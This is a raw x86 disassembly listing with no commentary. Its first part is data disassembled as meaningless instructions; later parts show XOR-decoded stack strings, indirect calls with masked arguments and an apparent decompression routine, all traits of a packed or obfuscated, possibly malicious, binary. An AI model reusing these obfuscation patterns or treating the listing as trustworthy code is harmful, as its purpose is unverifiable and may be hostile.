  41cf42:	and    eax,0x51274f6f
  41cf47:	xor    cl,cl
  41cf49:	sbb    al,0x65
  41cf4b:	pop    edx
  41cf4c:	add    DWORD PTR [edx-0x58],ebx
  41cf4f:	shl    esp,1
  41cf51:	pop    eax
  41cf52:	adc    bh,ch
  41cf54:	in     eax,dx
  41cf55:	jecxz  0x41cfb3
  41cf57:	hlt    
  41cf58:	mov    eax,0xccf779bd
  41cf5d:	dec    eax
  41cf5e:	or     BYTE PTR [ebp+0x6e],cl
  41cf61:	sub    ebx,DWORD PTR [esp+ecx*2+0x306b5f0b]
  41cf68:	std    
  41cf69:	out    0x6d,eax
  41cf6b:	jge    0x41cfe6
  41cf6d:	and    ch,BYTE PTR [esp+eiz*2-0x57]
  41cf71:	pop    edi
  41cf72:	pop    es
  41cf73:	int3   
  41cf74:	test   BYTE PTR [ebx],bh
  41cf76:	out    0x17,al
  41cf78:	rol    DWORD PTR [edx],1
  41cf7a:	sar    BYTE PTR [edx],0xbb
  41cf7d:	mov    ebp,0x2f17338d
  41cf82:	rcr    DWORD PTR [ebp+0x58b99118],0xf0
  41cf89:	cmp    edi,DWORD PTR [eax+0x6f]
  41cf8c:	mov    BYTE PTR [eax-0x59d8579b],ch
  41cf92:	jns    0x41cf52
  41cf94:	jmp    0x5dc03a32
  41cf99:	or     eax,0xaabd8048
  41cf9e:	push   ecx
  41cf9f:	fisttp WORD PTR [ebp-0x33]
  41cfa2:	out    0x88,al
  41cfa4:	retf   0x12b3
  41cfa7:	fild   DWORD PTR [ecx+eax*2]
  41cfaa:	dec    edx
  41cfab:	xchg   ebp,eax
  41cfac:	xor    edx,ecx
  41cfae:	push   0x75605018
  41cfb3:	or     DWORD PTR [ebx],ecx
  41cfb5:	outs   dx,BYTE PTR ds:[esi]
  41cfb6:	(bad)  
  41cfb7:	std    
  41cfb8:	jmp    0xf6dd:0xe51c7b7
  41cfbf:	xchg   ecx,eax
  41cfc0:	fisttp QWORD PTR [edi+0x47334044]
  41cfc6:	inc    esp
  41cfc7:	enter  0xf223,0xd4
  41cfcb:	enter  0xaa84,0x4d
  41cfcf:	push   esp
  41cfd0:	xchg   ebp,eax
  41cfd1:	jg     0x41d046
  41cfd3:	add    ecx,0x5708c0
  41cfd9:	imul   ecx,edx
  41cfdc:	mov    DWORD PTR [ebp-0x58],ecx
  41cfdf:	mov    ecx,DWORD PTR [ebp+0x8]
  41cfe2:	mov    edx,DWORD PTR [ebp-0x54]
  41cfe5:	add    ecx,0x64f8a2
  41cfeb:	or     ecx,edx
  41cfed:	mov    DWORD PTR [ebp-0x54],ecx
  41cff0:	mov    ecx,DWORD PTR [ebp+0x8]
  41cff3:	mov    edx,DWORD PTR [ebp-0x50]
  41cff6:	add    ecx,0x242ebed
  41cffc:	xor    ecx,edx
  41cffe:	mov    DWORD PTR [ebp-0x50],ecx
  41d001:	mov    ecx,DWORD PTR [ebp+0x8]
  41d004:	mov    edx,DWORD PTR [ebp-0x4c]
  41d007:	add    ecx,edi
  41d009:	and    ecx,edx
  41d00b:	mov    DWORD PTR [ebp-0x4c],ecx
  41d00e:	mov    ecx,DWORD PTR [ebp+0x8]
  41d011:	mov    edx,DWORD PTR [ebp-0x48]
  41d014:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41d01b:	mov    DWORD PTR [ebp-0x48],ecx
  41d01e:	mov    ecx,DWORD PTR [ebp+0x8]
  41d021:	mov    edx,0xfa5e15e2
  41d026:	sub    edx,ecx
  41d028:	add    edx,DWORD PTR [ebp-0x44]
  41d02b:	mov    DWORD PTR [ebp-0x44],edx
  41d02e:	mov    ecx,DWORD PTR [ebp+0x8]
  41d031:	xor    ecx,eax
  41d033:	add    ecx,esi
  41d035:	jne    0x41abff
  41d03b:	mov    ecx,DWORD PTR [ebp-0x8]
  41d03e:	xor    ecx,eax
  41d040:	mov    eax,DWORD PTR [ebp+0x10]
  41d043:	add    ecx,esi
  41d045:	mov    DWORD PTR [eax],ecx
  41d047:	pop    edi
  41d048:	pop    esi
  41d049:	pop    ebx
  41d04a:	leave  
  41d04b:	ret    0xc
  41d04e:	add    al,ah
  41d050:	inc    edx
  41d051:	add    BYTE PTR [eax+eiz*8],al
  41d054:	inc    edx
  41d055:	add    BYTE PTR [eax],cl
  41d057:	loopne 0x41d09b
  41d059:	add    BYTE PTR [eax+eiz*8],cl
  41d05c:	inc    edx
  41d05d:	add    BYTE PTR [eax],dl
  41d05f:	loopne 0x41d0a3
  41d061:	add    BYTE PTR [eax+eiz*8],dl
  41d064:	inc    edx
  41d065:	add    BYTE PTR [eax],bl
  41d067:	loopne 0x41d0ab
  41d069:	add    BYTE PTR [eax+eiz*8],bl
  41d06c:	inc    edx
  41d06d:	add    BYTE PTR [eax],ah
  41d06f:	loopne 0x41d0b3
  41d071:	add    BYTE PTR [eax+eiz*8],ah
  41d074:	inc    edx
  41d075:	add    BYTE PTR [eax],ch
  41d077:	loopne 0x41d0bb
  41d079:	add    BYTE PTR [eax],al
  41d07b:	add    BYTE PTR [ebx+0x0],al
  41d07e:	add    al,0x0
  41d080:	inc    ebx
  41d081:	add    BYTE PTR [eax],cl
  41d083:	add    BYTE PTR [ebx+0x0],al
  41d086:	or     al,0x0
  41d088:	inc    ebx
  41d089:	add    BYTE PTR [eax],dl
  41d08b:	add    BYTE PTR [ebx+0x0],al
  41d08e:	adc    al,0x0
  41d090:	inc    ebx
  41d091:	add    BYTE PTR [eax],bl
  41d093:	add    BYTE PTR [ebx+0x0],al
  41d096:	sbb    al,0x0
  41d098:	inc    ebx
  41d099:	add    BYTE PTR [eax],al
  41d09b:	lock inc edx
  41d09d:	add    BYTE PTR [eax+esi*8],al
  41d0a0:	inc    edx
  41d0a1:	add    BYTE PTR [eax],cl
  41d0a3:	lock inc edx
  41d0a5:	add    BYTE PTR [eax+esi*8],cl
  41d0a8:	inc    edx
  41d0a9:	add    BYTE PTR [eax],dl
  41d0ab:	lock inc edx
  41d0ad:	add    BYTE PTR [eax+esi*8],dl
  41d0b0:	inc    edx
  41d0b1:	add    BYTE PTR [eax],bl
  41d0b3:	lock inc edx
  41d0b5:	add    BYTE PTR [eax+esi*8],bl
  41d0b8:	inc    edx
	...
  41d0c1:	add    BYTE PTR [eax],al
  41d0c3:	add    BYTE PTR [ecx+0x4d35d8],al
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [edx],al
  41d0cd:	add    BYTE PTR [eax],al
  41d0cf:	add    BYTE PTR [esi],bh
  41d0d1:	add    BYTE PTR [eax],al
  41d0d3:	add    BYTE PTR [eax],al
  41d0d5:	rol    DWORD PTR [ecx],1
  41d0d7:	add    BYTE PTR [eax],al
  41d0d9:	lds    eax,FWORD PTR [ecx]
  41d0db:	add    BYTE PTR [eax],al
  41d0dd:	adc    BYTE PTR [ebx+0x0],al
  41d0e0:	add    al,0x10
  41d0e2:	inc    ebx
  41d0e3:	add    BYTE PTR [eax],cl
  41d0e5:	adc    BYTE PTR [ebx+0x0],al
  41d0e8:	or     al,0x10
  41d0ea:	inc    ebx
  41d0eb:	add    BYTE PTR [eax],dl
  41d0ed:	adc    BYTE PTR [ebx+0x0],al
  41d0f0:	adc    al,0x10
  41d0f2:	inc    ebx
  41d0f3:	add    BYTE PTR [eax],bl
  41d0f5:	adc    BYTE PTR [ebx+0x0],al
  41d0f8:	sbb    al,0x10
  41d0fa:	inc    ebx
  41d0fb:	add    BYTE PTR [eax],al
  41d0fd:	add    BYTE PTR [eax],al
  41d0ff:	add    BYTE PTR [edx+0x53],dl
  41d102:	inc    esp
  41d103:	push   ebx
  41d104:	lea    edx,[esi-0x4e]
  41d107:	pop    ds
  41d108:	xlat   BYTE PTR ds:[ebx]
  41d109:	push   ss
  41d10a:	add    eax,0xa23aac47
  41d10f:	cmp    cl,cl
  41d111:	bound  ecx,QWORD PTR ds:0x1ca
  41d117:	add    BYTE PTR [edx+edi*1+0x5c],al
  41d11b:	dec    ecx
  41d11c:	outs   dx,BYTE PTR ds:[esi]
  41d11d:	outs   dx,WORD PTR ds:[esi]
  41d11f:	inc    esi
  41d120:	outs   dx,DWORD PTR ds:[esi]
  41d121:	ins    BYTE PTR es:[edi],dx
  41d122:	fs gs jb 0x41d16a
  41d126:	popa   
  41d127:	je     0x41d18a
  41d129:	pop    esp
  41d12a:	push   edi
  41d12b:	imul   ebp,DWORD PTR [esi+0x64],0x4973776f
  41d132:	outs   dx,BYTE PTR ds:[esi]
  41d133:	je     0x41d19a
  41d135:	jb     0x41d1a5
  41d137:	popa   
  41d138:	ins    BYTE PTR es:[edi],dx
  41d139:	inc    esi
  41d13a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x81ec558b
  41d142:	in     al,dx
  41d143:	or     BYTE PTR [ecx],al
  41d145:	add    BYTE PTR [eax],al
  41d147:	push   ebx
  41d148:	mov    eax,ebx
  41d14a:	xchg   ecx,eax
  41d14b:	mov    eax,DWORD PTR [ebp+0x8]
  41d14e:	cmp    eax,0xf89c8581
  41d153:	jne    0x41d5d8
  41d159:	mov    eax,DWORD PTR [ebp+0xc]
  41d15c:	cmp    eax,0xf89c8580
  41d161:	jne    0x41d5d8
  41d167:	mov    eax,DWORD PTR [ebp+0x24]
  41d16a:	mov    DWORD PTR [ebp-0x4],eax
  41d16d:	mov    BYTE PTR [ebp-0x18],0x1b
  41d171:	mov    BYTE PTR [ebp-0x17],0x1e
  41d175:	mov    BYTE PTR [ebp-0x16],0x5
  41d179:	mov    BYTE PTR [ebp-0x15],0x4f
  41d17d:	mov    BYTE PTR [ebp-0x14],0x4c
  41d181:	mov    BYTE PTR [ebp-0x13],0x72
  41d185:	mov    BYTE PTR [ebp-0x20],0x9
  41d189:	mov    BYTE PTR [ebp-0x1f],0xf
  41d18d:	mov    BYTE PTR [ebp-0x1e],0x19
  41d191:	mov    BYTE PTR [ebp-0x1d],0xc
  41d195:	mov    BYTE PTR [ebp-0x1c],0x4f
  41d199:	mov    BYTE PTR [ebp-0x1b],0x4c
  41d19d:	mov    BYTE PTR [ebp-0x1a],0x72
  41d1a1:	mov    BYTE PTR [ebp-0x28],0xf
  41d1a5:	mov    BYTE PTR [ebp-0x27],0x1a
  41d1a9:	mov    BYTE PTR [ebp-0x26],0x6
  41d1ad:	mov    BYTE PTR [ebp-0x25],0xb
  41d1b1:	mov    BYTE PTR [ebp-0x24],0x1d
  41d1b5:	mov    BYTE PTR [ebp-0x23],0x2
  41d1b9:	push   esi
  41d1ba:	mov    BYTE PTR [ebp-0x22],0x5
  41d1be:	mov    BYTE PTR [ebp-0x21],0x72
  41d1c2:	xor    esi,esi
  41d1c4:	mov    eax,0xf9
  41d1c9:	lea    ecx,[ebp+esi*1-0x18]
  41d1cd:	movzx  edx,BYTE PTR [ecx]
  41d1d0:	xor    edx,0x75
  41d1d3:	add    edx,eax
  41d1d5:	inc    esi
  41d1d6:	mov    BYTE PTR [ecx],dl
  41d1d8:	cmp    esi,0x6
  41d1db:	jb     0x41d1c9
  41d1dd:	xor    esi,esi
  41d1df:	lea    ecx,[ebp+esi*1-0x20]
  41d1e3:	movzx  edx,BYTE PTR [ecx]
  41d1e6:	xor    edx,0x75
  41d1e9:	add    edx,eax
  41d1eb:	inc    esi
  41d1ec:	mov    BYTE PTR [ecx],dl
  41d1ee:	cmp    esi,0x7
  41d1f1:	jb     0x41d1df
  41d1f3:	xor    esi,esi
  41d1f5:	lea    ecx,[ebp+esi*1-0x28]
  41d1f9:	movzx  edx,BYTE PTR [ecx]
  41d1fc:	xor    edx,0x75
  41d1ff:	add    edx,eax
  41d201:	inc    esi
  41d202:	mov    BYTE PTR [ecx],dl
  41d204:	cmp    esi,0x8
  41d207:	jb     0x41d1f5
  41d209:	lea    eax,[ebp-0x2c]
  41d20c:	mov    DWORD PTR [ebp-0x8],eax
  41d20f:	mov    ecx,DWORD PTR [ebp-0x8]
  41d212:	mov    eax,0x7113fcef
  41d217:	mov    DWORD PTR [ecx],eax
  41d219:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d21c:	push   edi
  41d21d:	mov    esi,0x4e20
  41d222:	mov    ebx,0x3272e4
  41d227:	cmp    ecx,eax
  41d229:	jne    0x41d2f4
  41d22f:	lea    eax,[esi+0x59]
  41d232:	mov    WORD PTR [ebp-0x78],ax
  41d236:	mov    eax,esi
  41d238:	mov    WORD PTR [ebp-0x76],ax
  41d23c:	add    eax,0x5f
  41d23f:	mov    WORD PTR [ebp-0x74],ax
  41d243:	lea    eax,[esi+0x1e]
  41d246:	mov    WORD PTR [ebp-0x72],ax
  41d24a:	add    eax,0x23
  41d24d:	mov    ecx,eax
  41d24f:	lea    eax,[esi+0x17]
  41d252:	mov    WORD PTR [ebp-0x66],ax
  41d256:	mov    eax,esi
  41d258:	mov    WORD PTR [ebp-0x64],ax
  41d25c:	add    eax,0x14
  41d25f:	mov    WORD PTR [ebp-0x62],ax
  41d263:	mov    eax,0x46d
  41d268:	mov    WORD PTR [ebp-0x60],ax
  41d26c:	mov    eax,0x567a
  41d271:	mov    WORD PTR [ebp-0x5e],ax
  41d275:	mov    eax,0x611a
  41d27a:	mov    WORD PTR [ebp-0x5c],ax
  41d27e:	lea    eax,[ebp-0xe0]
  41d284:	push   eax
  41d285:	mov    eax,DWORD PTR [ebp+0xc]
  41d288:	mov    edi,0x751089d
  41d28d:	xor    eax,edi
  41d28f:	add    eax,ebx
  41d291:	push   eax
  41d292:	mov    WORD PTR [ebp-0x70],cx
  41d296:	lea    ecx,[esi+0x1a]
  41d299:	mov    edx,ecx
  41d29b:	lea    eax,[ebp-0x78]
  41d29e:	push   eax
  41d29f:	mov    eax,DWORD PTR [ebp-0x4]
  41d2a2:	mov    eax,DWORD PTR [eax+0x198]
  41d2a8:	mov    WORD PTR [ebp-0x6e],dx
  41d2ac:	mov    edx,0x4f94
  41d2b1:	mov    WORD PTR [ebp-0x6c],dx
  41d2b5:	mov    DWORD PTR [ebp-0x6a],0x4e614e3b
  41d2bc:	mov    DWORD PTR [ebp-0x5a],0x4e3af108
  41d2c3:	mov    DWORD PTR [ebp-0xe0],0x1
  41d2cd:	mov    DWORD PTR [ebp-0xdc],0x255
  41d2d7:	push   DWORD PTR [eax]
  41d2d9:	mov    eax,DWORD PTR [ebp+0x10]
  41d2dc:	call   eax
  41d2de:	mov    DWORD PTR [ebp-0x8],eax
  41d2e1:	mov    eax,DWORD PTR [ebp-0x8]
  41d2e4:	test   eax,eax
  41d2e6:	je     0x41d2f9
  41d2e8:	xor    DWORD PTR ds:0x76586876,0x87687666
  41d2f2:	jmp    0x41d2f9
  41d2f4:	mov    edi,0x751089d
  41d2f9:	mov    eax,DWORD PTR [ebp-0x4]
  41d2fc:	mov    ecx,DWORD PTR [eax+0x18c]
  41d302:	xor    eax,eax
  41d304:	cmp    DWORD PTR [ecx],eax
  41d306:	jne    0x41d573
  41d30c:	mov    ecx,DWORD PTR [ebp-0x4]
  41d30f:	mov    ecx,DWORD PTR [ecx+0x17c]
  41d315:	mov    DWORD PTR [ecx],eax
  41d317:	mov    ecx,DWORD PTR [ebp-0x4]
  41d31a:	mov    ecx,DWORD PTR [ecx+0x180]
  41d320:	mov    DWORD PTR [ecx],eax
  41d322:	mov    eax,0x4f8f
  41d327:	mov    WORD PTR [ebp-0x9c],ax
  41d32e:	mov    eax,esi
  41d330:	mov    WORD PTR [ebp-0x9a],ax
  41d337:	mov    eax,0x4e7f
  41d33c:	mov    WORD PTR [ebp-0x98],ax
  41d343:	add    eax,0xffffffc0
  41d346:	mov    WORD PTR [ebp-0x96],ax
  41d34d:	mov    eax,0x4f90
  41d352:	mov    WORD PTR [ebp-0x94],ax
  41d359:	mov    eax,0x4e3c
  41d35e:	mov    WORD PTR [ebp-0x92],ax
  41d365:	add    eax,0x25
  41d368:	mov    WORD PTR [ebp-0x90],ax
  41d36f:	mov    eax,0x4e3a
  41d374:	mov    WORD PTR [ebp-0x8e],ax
  41d37b:	mov    eax,esi
  41d37d:	mov    WORD PTR [ebp-0x8c],ax
  41d384:	mov    eax,0x4e3b
  41d389:	mov    WORD PTR [ebp-0x8a],ax
  41d390:	mov    eax,0x99ff
  41d395:	mov    WORD PTR [ebp-0x88],ax
  41d39c:	mov    eax,0x828c
  41d3a1:	mov    WORD PTR [ebp-0x86],ax
  41d3a8:	mov    eax,0xd671
  41d3ad:	mov    WORD PTR [ebp-0x84],ax
  41d3b4:	mov    eax,0xd7ad
  41d3b9:	mov    WORD PTR [ebp-0x82],ax
  41d3c0:	mov    eax,0x27aa
  41d3c5:	mov    WORD PTR [ebp-0x80],ax
  41d3c9:	mov    eax,0x47aa
  41d3ce:	mov    WORD PTR [ebp-0x7e],ax
  41d3d2:	mov    eax,0x4e3d
  41d3d7:	push   0x8
  41d3d9:	mov    WORD PTR [ebp-0x7c],ax
  41d3dd:	mov    DWORD PTR [ebp-0x10],0xb061a0f
  41d3e4:	mov    DWORD PTR [ebp-0xc],0x7205021d
  41d3eb:	lea    eax,[ebp-0x10]
  41d3ee:	pop    ecx
  41d3ef:	mov    dl,BYTE PTR [eax]
  41d3f1:	xor    dl,0x75
  41d3f4:	sub    dl,0x7
  41d3f7:	mov    BYTE PTR [eax],dl
  41d3f9:	inc    eax
  41d3fa:	dec    ecx
  41d3fb:	jne    0x41d3ef
  41d3fd:	lea    eax,[ebp-0x10]
  41d400:	mov    DWORD PTR [ebp-0xdc],eax
  41d406:	lea    eax,[ebp-0xe0]
  41d40c:	push   eax
  41d40d:	mov    eax,DWORD PTR [ebp+0xc]
  41d410:	xor    eax,edi
  41d412:	add    eax,ebx
  41d414:	push   eax
  41d415:	mov    eax,DWORD PTR [ebp-0x4]
  41d418:	add    eax,0x66
  41d41b:	push   eax
  41d41c:	mov    eax,DWORD PTR [ebp-0x4]
  41d41f:	mov    eax,DWORD PTR [eax+0x198]
  41d425:	mov    DWORD PTR [ebp-0xe0],0x1
  41d42f:	push   DWORD PTR [eax]
  41d431:	mov    eax,DWORD PTR [ebp+0x10]
  41d434:	call   eax
  41d436:	mov    ecx,DWORD PTR [ebp+0x8]
  41d439:	xor    ecx,edi
  41d43b:	add    ecx,ebx
  41d43d:	mov    DWORD PTR [ebp-0x8],eax
  41d440:	cmp    eax,ecx
  41d442:	jne    0x41d45d
  41d444:	mov    eax,ds:0x33730bee
  41d449:	or     eax,0x22150bef
  41d44e:	mov    ds:0x33730bee,eax
  41d453:	add    eax,0x3372e90f
  41d458:	mov    ds:0x33730bee,eax
  41d45d:	mov    ecx,0x4f88
  41d462:	mov    eax,ecx
  41d464:	mov    WORD PTR [ebp-0x40],ax
  41d468:	mov    eax,0x4e75
  41d46d:	mov    edx,eax
  41d46f:	mov    WORD PTR [ebp-0x3e],dx
  41d473:	lea    edx,[ecx+0x15]
  41d476:	mov    WORD PTR [ebp-0x3c],dx
  41d47a:	add    edx,0xfffffff8
  41d47d:	mov    WORD PTR [ebp-0x3a],dx
  41d481:	lea    edx,[ecx+0xb]
  41d484:	mov    WORD PTR [ebp-0x38],dx
  41d488:	add    edx,0x1b
  41d48b:	mov    WORD PTR [ebp-0x36],dx
  41d48f:	lea    edx,[ecx+0x21]
  41d492:	mov    WORD PTR [ebp-0x34],dx
  41d496:	mov    WORD PTR [ebp-0x32],cx
  41d49a:	mov    ecx,esi
  41d49c:	mov    WORD PTR [ebp-0x30],cx
  41d4a0:	lea    ecx,[edx-0x1]
  41d4a3:	mov    edx,ecx
  41d4a5:	mov    WORD PTR [ebp-0x54],dx
  41d4a9:	mov    edx,eax
  41d4ab:	mov    WORD PTR [ebp-0x52],dx
  41d4af:	add    edx,0x8
  41d4b2:	mov    WORD PTR [ebp-0x50],dx
  41d4b6:	mov    WORD PTR [ebp-0x4e],ax
  41d4ba:	add    eax,0xfffffffe
  41d4bd:	mov    WORD PTR [ebp-0x4c],ax
  41d4c1:	lea    eax,[ecx-0x1a]
  41d4c4:	mov    WORD PTR [ebp-0x4a],ax
  41d4c8:	add    eax,0xfffffffb
  41d4cb:	mov    WORD PTR [ebp-0x48],ax
  41d4cf:	mov    WORD PTR [ebp-0x46],cx
  41d4d3:	mov    WORD PTR [ebp-0x44],si
  41d4d7:	mov    eax,DWORD PTR [ebp+0x8]
  41d4da:	movzx  ecx,WORD PTR [ebp-0x54]
  41d4de:	xor    eax,edi
  41d4e0:	add    eax,ebx
  41d4e2:	xor    eax,ecx
  41d4e4:	mov    WORD PTR [ebp-0x54],ax
  41d4e8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4eb:	movzx  ecx,WORD PTR [ebp-0x40]
  41d4ef:	xor    eax,edi
  41d4f1:	add    eax,ebx
  41d4f3:	xor    eax,ecx
  41d4f5:	mov    WORD PTR [ebp-0x40],ax
  41d4f9:	xor    eax,eax
  41d4fb:	mov    WORD PTR [ebp-0xf4],ax
  41d502:	mov    WORD PTR [ebp-0x108],ax
  41d509:	mov    edi,DWORD PTR [ebp+0x24]
  41d50c:	lea    eax,[ebp-0xf4]
  41d512:	lea    edx,[ebp-0x54]
  41d515:	mov    DWORD PTR [ebp-0xe0],0x2
  41d51f:	mov    DWORD PTR [ebp-0xdc],eax
  41d525:	call   0x41ff39
  41d52a:	mov    DWORD PTR [ebp-0xd8],eax
  41d530:	lea    eax,[ebp-0xe0]
  41d536:	push   eax
  41d537:	mov    eax,DWORD PTR [ebp+0xc]
  41d53a:	xor    eax,0x751089d
  41d53f:	add    eax,ebx
  41d541:	push   eax
  41d542:	lea    eax,[ebp-0x9c]
  41d548:	push   eax
  41d549:	push   DWORD PTR [ebp-0x8]
  41d54c:	mov    eax,DWORD PTR [ebp+0x10]
  41d54f:	call   eax
  41d551:	mov    edi,DWORD PTR [ebp+0x24]
  41d554:	lea    eax,[ebp-0x108]
  41d55a:	lea    edx,[ebp-0x40]
  41d55d:	mov    DWORD PTR [ebp-0xdc],eax
  41d563:	call   0x41ff39
  41d568:	mov    DWORD PTR [ebp-0xd8],eax
  41d56e:	mov    edi,0x751089d
  41d573:	mov    eax,DWORD PTR [ebp+0x14]
  41d576:	push   DWORD PTR [ebp-0x4]
  41d579:	push   DWORD PTR [ebp+0x20]
  41d57c:	push   DWORD PTR [ebp+0x1c]
  41d57f:	push   DWORD PTR [ebp+0x18]
  41d582:	push   DWORD PTR [ebp+0x10]
  41d585:	push   DWORD PTR [ebp+0x8]
  41d588:	push   DWORD PTR [ebp+0xc]
  41d58b:	call   0x41e7d8
  41d590:	test   eax,eax
  41d592:	je     0x41d5d6
  41d594:	add    DWORD PTR [ebp-0x4],eax
  41d597:	push   DWORD PTR [ebp-0x4]
  41d59a:	lea    esi,[ebp+0x4]
  41d59d:	call   0x41d9c6
  41d5a2:	mov    eax,DWORD PTR [ebp-0x4]
  41d5a5:	mov    eax,DWORD PTR [eax+0x1c8]
  41d5ab:	mov    eax,DWORD PTR [eax]
  41d5ad:	xor    eax,edi
  41d5af:	add    eax,ebx
  41d5b1:	mov    eax,DWORD PTR [ebp-0x4]
  41d5b4:	jne    0x41d5cc
  41d5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  41d5b9:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d5bf:	push   DWORD PTR [ecx]
  41d5c1:	mov    eax,DWORD PTR [eax+0x1d8]
  41d5c7:	call   DWORD PTR [eax+0x28]
  41d5ca:	jmp    0x41d5d6
  41d5cc:	mov    eax,DWORD PTR [eax+0x17c]
  41d5d2:	mov    eax,DWORD PTR [eax]
  41d5d4:	add    DWORD PTR [esi],eax
  41d5d6:	pop    edi
  41d5d7:	pop    esi
  41d5d8:	pop    ebx
  41d5d9:	leave  
  41d5da:	ret    0x20
  41d5dd:	push   edi
  41d5de:	push   esi
  41d5df:	push   ebx
  41d5e0:	push   ebp
  41d5e1:	mov    ebp,esp
  41d5e3:	mov    eax,DWORD PTR [ebp+0x24]
  41d5e6:	add    DWORD PTR [ebp+0x28],eax
  41d5e9:	push   eax
  41d5ea:	cld    
  41d5eb:	mov    esi,DWORD PTR [ebp+0x18]
  41d5ee:	add    DWORD PTR [ebp+0x1c],esi
  41d5f1:	push   esi
  41d5f2:	mov    esi,DWORD PTR [ebp+0x14]
  41d5f5:	lods   eax,DWORD PTR ds:[esi]
  41d5f6:	xchg   edx,eax
  41d5f7:	push   edx
  41d5f8:	mov    cl,BYTE PTR [esi-0x2]
  41d5fb:	or     eax,0xffffffff
  41d5fe:	shl    eax,cl
  41d600:	not    eax
  41d602:	push   eax
  41d603:	mov    cl,dh
  41d605:	or     eax,0xffffffff
  41d608:	shl    eax,cl
  41d60a:	not    eax
  41d60c:	push   eax
  41d60d:	add    cl,dl
  41d60f:	mov    edi,esi
  41d611:	sub    esp,0xc
  41d614:	sub    eax,eax
  41d616:	inc    eax
  41d617:	push   eax
  41d618:	push   eax
  41d619:	push   eax
  41d61a:	push   eax
  41d61b:	push   eax
  41d61c:	push   edi
  41d61d:	sub    esi,esi
  41d61f:	push   esi
  41d620:	or     ebx,0xffffffff
  41d623:	mov    eax,0x300
  41d628:	shl    eax,cl
  41d62a:	lea    ecx,[eax+0x736]
  41d630:	mov    eax,0x4000400
  41d635:	shr    ecx,1
  41d637:	rep stos DWORD PTR es:[edi],eax
  41d639:	push   0x5
  41d63b:	pop    ecx
  41d63c:	call   0x41d927
  41d641:	loop   0x41d63c
  41d643:	lea    esi,[esi]
  41d645:	lea    edi,[edi]
  41d647:	mov    edi,DWORD PTR [ebp-0x4]
  41d64a:	mov    eax,DWORD PTR [ebp-0x10]
  41d64d:	sub    edi,DWORD PTR [ebp+0x24]
  41d650:	and    eax,edi
  41d652:	mov    DWORD PTR [ebp-0x18],eax
  41d655:	mov    al,0x0
  41d657:	call   0x41d93f
  41d65c:	jne    0x41d6f7
  41d662:	mov    cl,BYTE PTR [ebp-0xc]
  41d665:	and    edi,DWORD PTR [ebp-0x14]
  41d668:	shl    edi,cl
  41d66a:	sub    cl,0x8
  41d66d:	neg    cl
  41d66f:	shr    esi,cl
  41d671:	pop    eax
  41d672:	add    edi,esi
  41d674:	pop    esi
  41d675:	lea    edi,[edi+edi*2]
  41d678:	shl    edi,0x8
  41d67b:	cmp    al,0x7
  41d67d:	pop    edx
  41d67e:	lea    ecx,[esi+edi*2+0xe6c]
  41d685:	push   ecx
  41d686:	push   esi
  41d687:	mov    esi,0x100
  41d68c:	push   eax
  41d68d:	mov    al,0x1
  41d68f:	jb     0x41d6c5
  41d691:	mov    edi,DWORD PTR [ebp-0x4]
  41d694:	sub    edi,DWORD PTR [ebp-0x24]
  41d697:	movzx  edi,BYTE PTR [edi]
  41d69a:	mov    ebp,DWORD PTR [ebp-0x34]
  41d69d:	shl    edi,1
  41d69f:	mov    ecx,esi
  41d6a1:	and    esi,edi
  41d6a3:	add    ecx,esi
  41d6a5:	lea    ebp,[ebp+ecx*2+0x0]
  41d6a9:	call   0x41d95e
  41d6ae:	mov    ecx,eax
  41d6b0:	shr    esi,0x8
  41d6b3:	and    ecx,0x1
  41d6b6:	cmp    esi,ecx
  41d6b8:	mov    esi,0x100
  41d6bd:	jne    0x41d6cd
  41d6bf:	cmp    eax,esi
  41d6c1:	jb     0x41d69a
  41d6c3:	jmp    0x41d6d9
  41d6c5:	mov    ebp,DWORD PTR [ebp-0x34]
  41d6c8:	call   0x41d95e
  41d6cd:	inc    eax
  41d6ce:	inc    esi
  41d6cf:	sub    eax,0x1
  41d6d2:	sub    esi,0x1
  41d6d5:	cmp    eax,esi
  41d6d7:	jb     0x41d6c5
  41d6d9:	pop    edx
  41d6da:	inc    edx
  41d6db:	cmp    edx,0x5
  41d6de:	dec    edx
  41d6df:	mov    ecx,edx
  41d6e1:	jb     0x41d6f2
  41d6e3:	inc    edx
  41d6e4:	cmp    edx,0xb
  41d6e7:	dec    edx
  41d6e8:	mov    cl,0x4
  41d6ea:	dec    cl
  41d6ec:	jb     0x41d6f2
  41d6ee:	mov    cl,0x7
  41d6f0:	dec    cl
  41d6f2:	sub    edx,ecx
  41d6f4:	push   edx
  41d6f5:	jmp    0x41d746
  41d6f7:	mov    al,0xc1
  41d6f9:	dec    al
  41d6fb:	call   0x41d94f
  41d700:	jne    0x41d716
  41d702:	pop    eax
  41d703:	pop    edi
  41d704:	pop    edx
  41d705:	pop    ecx
  41d706:	pop    edx
  41d707:	pop    ecx
  41d708:	push   DWORD PTR [esp]
  41d70b:	push   ecx
  41d70c:	push   edx
  41d70d:	mov    edx,0x664
  41d712:	mov    cl,0x0
  41d714:	jmp    0x41d789
  41d716:	mov    al,0xcd
  41d718:	dec    al
  41d71a:	call   0x41d94f
  41d71f:	jne    0x41d74f
  41d721:	mov    al,0xf1
  41d723:	dec    al
  41d725:	call   0x41d93f
  41d72a:	jne    0x41d77f
  41d72c:	pop    eax
  41d72d:	cmp    al,0x7
  41d72f:	mov    al,0x9
  41d731:	jb     0x41d735
  41d733:	mov    al,0xb
  41d735:	push   eax
  41d736:	mov    esi,DWORD PTR [ebp-0x4]
  41d739:	sub    esi,DWORD PTR [ebp-0x24]
  41d73c:	cmp    esi,DWORD PTR [ebp+0x24]
  41d73f:	jb     0x41d916
  41d745:	lods   al,BYTE PTR ds:[esi]
  41d746:	mov    edi,DWORD PTR [ebp-0x4]
  41d749:	stos   BYTE PTR es:[edi],al
  41d74a:	jmp    0x41d8dd
  41d74f:	mov    al,0xd8
  41d751:	call   0x41d94f
  41d756:	mov    esi,DWORD PTR [ebp-0x28]
  41d759:	je     0x41d776
  41d75b:	mov    al,0xe4
  41d75d:	call   0x41d94f
  41d762:	mov    esi,DWORD PTR [ebp-0x2c]
  41d765:	je     0x41d770
  41d767:	mov    esi,DWORD PTR [ebp-0x30]
  41d76a:	mov    ecx,DWORD PTR [ebp-0x2c]
